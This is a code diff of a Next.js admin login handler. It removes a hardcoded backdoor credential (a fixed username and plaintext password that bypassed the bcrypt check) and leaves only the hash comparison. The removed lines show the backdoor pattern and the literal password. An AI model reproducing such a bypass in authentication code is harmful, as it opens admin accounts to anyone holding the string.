@@ -29,13 +29,7 @@ export async function POST(request: NextRequest) {
 
     const admin = result[0]
 
-    let isPasswordValid = false
-
-    if (username === "awan" && password === "awansmith123") {
-      isPasswordValid = true
-    } else {
-      isPasswordValid = await bcrypt.compare(password, admin.password_hash)
-    }
+    const isPasswordValid = await bcrypt.compare(password, admin.password_hash)
 
     if (!isPasswordValid) {
       return NextResponse.json({ error: "用户名或密码错误" }, { status: 401 })
